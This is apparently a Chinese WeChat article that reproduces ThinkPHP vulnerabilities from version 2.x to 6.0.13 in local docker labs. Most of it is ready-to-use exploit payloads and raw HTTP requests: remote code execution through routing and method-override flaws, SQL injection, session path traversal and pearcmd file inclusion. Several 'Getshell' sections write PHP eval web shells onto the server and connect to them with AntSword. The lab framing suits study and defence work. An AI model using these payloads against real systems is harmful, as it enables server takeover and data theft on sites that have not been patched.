#  漏洞复现 | ThinkPHP全版本漏洞复现

原创 Enomothem  [ Eonian Sharp ](javascript:void\(0\);)

**Eonian Sharp** ![]()

微信号 Eonian_sharp

功能介绍 Eonian Sharp | 永恒之锋，专注APT框架、渗透测试攻击与防御的研究与开发，没有永恒的安全，但有永恒的正义之锋击破黑暗的不速之客。

____

___发表于_

收录于合集

#漏洞复现 5 个

#信息安全 13 个

#渗透测试 10 个

# ThinkPHP

## TP - 2.x-RCE

ThinkPHP 2.x版本中，使用`preg_replace`的`/e`模式匹配路由：

    
    
    $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));

导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。

环境搭建

执行如下命令启动ThinkPHP 2.1的Demo应用：

    
    
    docker compose up -d

![]()

环境启动后，访问`http://your-ip:8080/Index/Index`即可查看到默认页面。

漏洞复现

直接访问`http://your-
ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D`即可执行`phpinfo()`：

![]()

## TP - 2.x-RCE x Getshell

下面给出一个能够直接菜刀连接的payload：

    
    
    /index.php?s=a/b/c/${@print(eval($_POST[1]))}

![]()

使用蚁剑连接

![]()

![]()

## TP - 5.0.9-SQLi

启动后，访问`http://your-ip/index.php?ids[]=1&ids[]=2`，即可看到用户名被显示了出来，说明环境运行成功。

![]()

  

访问`http://your-
ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，信息成功被爆出：

![]()

找到数据库账号密码，敏感信息泄露。

![]()

![]()

## TP - 5.0.22/5.1.29-RCE

ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。

控制器名未过滤导致rce

`function`为反射调用的函数，`vars[0]`为传入的回调函数，`vars[1][]`为参数为回调函数的参数

运行ThinkPHP 5.0.20版本：

    
    
    docker compose up -d

环境启动后，访问`http://your-ip:8080`即可看到ThinkPHP默认启动页面。

![]()

直接访问`http://your-
ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`，即可执行phpinfo

![]()

    
    
    http://192.168.66.132:8080/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

![]()

## TP - 5.0.22/5.1.29-RCE x Getshell

    
    
    http://192.168.66.132:8080/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php @eval($_POST[1]);?>' > shell.php

![]()

## TP - 5.0.23-RCE

ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。

在vulhub中开启即可

![]()

页面访问

![]()

抓包更改为POST

![]()

    
    
    POST /index.php?s=captcha HTTP/1.1  
    Host: localhost  
    Accept-Encoding: gzip, deflate  
    Accept: */*  
    Accept-Language: en  
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  
    Connection: close  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 72  
      
    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

![]()

## TP - 5.0.23-RCE x Getshell

    
    
    POST /index.php?s=captcha HTTP/1.1  
    Host: 192.168.66.132:8080  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Connection: close  
    Cookie: think_lang=zh-cn  
    Upgrade-Insecure-Requests: 1  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 73  
      
    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php @eval($_POST[1]);?>' > shell.php

![]()

响应500，实际上上传成功

![]()

访问浏览器

![]()

蚁剑连接

![]()

## TP - 6.0.1 Session任意文件操作

使用Kali来一步一步部署6.0的tp

    
    
    # 安装compose并放到bin下  
    curl -sS https://getcomposer.org/installer | php  
    mv composer.phar /usr/local/bin/composer  
    # 换源  
    composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/  
    # 安装thinkphp6.0  
    cd /var/www/html  
    composer create-project topthink/think tp6 6.0.1 --prefer-dist  
      
    # 依赖  
    sudo apt-get install php-mbstring  
    sudo apt-get install php-dom  
      
    # 启动  
    cd tp6  
    php think run -p 8000  
    # ！访问 ip:8000

![]()

![]()

  

更改版本，使用composer update即可更新版本, “^6.0.0”改为"6.0.1"

修改两个文件，首先修改app/controller/Index.php

    
    
    <?php  
    namespace app\controller;  
      
    use app\BaseController;  
      
    class Index extends BaseController  
    {  
        public function index()  
        {  
            # + 加上这三行  
            $a = isset($_GET['a']) && !empty($_GET['a']) ? $_GET['a'] : '';  
            $b = isset($_GET['b']) && !empty($_GET['b']) ? $_GET['b'] : '';  
            session($a,$b);  
            return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V6<br/><span style="font-size:30px">13载初心不改 - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';  
        }  
      
        public function hello($name = 'ThinkPHP6')  
        {  
            return 'hello,' . $name;  
        }  
    }

开启session且写入的session可控

/tp6/app/middleware.php 文件开启session

去掉注释session的//

![]()

>
> 遇到的一些小问题，kali下载php7.4一直缺少依赖，72,73都安装成功，但是composer必须7.4及以上，这就很烦，我干脆干掉它，直接找文件改代码，等于7.3。没想到成功。

![]()

本来是70400，再次执行php7.3 think run 就ok了

![]()

方法一

    
    
    GET /?a=a&b=12<?php+phpinfo();+?> HTTP/1.1  
    Host: 192.168.66.132:8001  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Connection: close  
    Cookie: PHPSESSID=1234567890123456789012345678.php;  
    Upgrade-Insecure-Requests: 1  
      
    

![]()

1234567890123456789012345678.php

    
    
    http://192.168.66.132:8001/runtime/session/sess_1234567890123456789012345678.php

  

![]()

访问没成功，emmm

方法二

    
    
    GET /?a=a&b=12<?php+phpinfo();+?> HTTP/1.1  
    Host: 192.168.66.132:8001  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Connection: close  
    Cookie: PHPSESSID=/../../../public/aaaaaaaaaaa.php;  
    Upgrade-Insecure-Requests: 1  
      
    

![]()

![]()

## TP - 6.0.13-Pearcmd x EXP

ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用`lang`参数来包含任意PHP文件。

虽然只能包含本地PHP文件，但在开启了`register_argc_argv`且安装了pcel/pear的环境下，可以包含`/usr/local/lib/php/pearcmd.php`并写入任意文件。

Payload:

    
    
    GET /public/index.php?+config-create+/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    think-lang:../../../../../../../../usr/local/lib/php/pearcmd  
    Cookie: think_lang=zh-cn  
    Connection: close

![]()

查看

    
    
    docker exec -it 20c58ef53381 /bin/bash

![]()

包含hello.php

    
    
    GET /public/index.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    think-lang:../../../../../../../../tmp/hello  
    Cookie: think_lang=zh-cn  
    Connection: close

浏览器访问

![]()

## TP - 6.0.13-Pearcmd x GET

需要根据实际情况改变文件名称，写不进去可以考虑多加点../

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/1.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

![]()

查看是否成功

![]()

文件包含读取

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../tmp/1 HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

![]()

![]()

  

## TP - 6.0.13-Pearcmd x HEADER

    
    
    GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/2.php HTTP/1.1  
    Host: 192.168.36.128  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    think-lang:../../../../../../../../../../../../../../usr/local/lib/php/pearcmd  
    Cookie: think_lang=zh-cn  
    Connection: close

![]()

查看

![]()

文件包含查看

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../tmp/2 HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

![]()

## TP - 6.0.13-Pearcmd x COOKIES

    
    
    GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/3.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd  
    Connection: close

![]()

查看是否成功

![]()

文件包含查看

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../tmp/3 HTTP/1.1  
    Host: 192.168.36.128  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Sec-Purpose: prefetch;prerender  
    Purpose: prefetch  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

![]()

## TP - 6.0.13-Pearcmd x Getshell

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

![]()

文件包含访问

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../var/www/html/shell HTTP/1.1  
    Host: 192.168.36.128  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Sec-Purpose: prefetch;prerender  
    Purpose: prefetch  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

页面访问

![]()

使用蚁剑连接

![]()

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

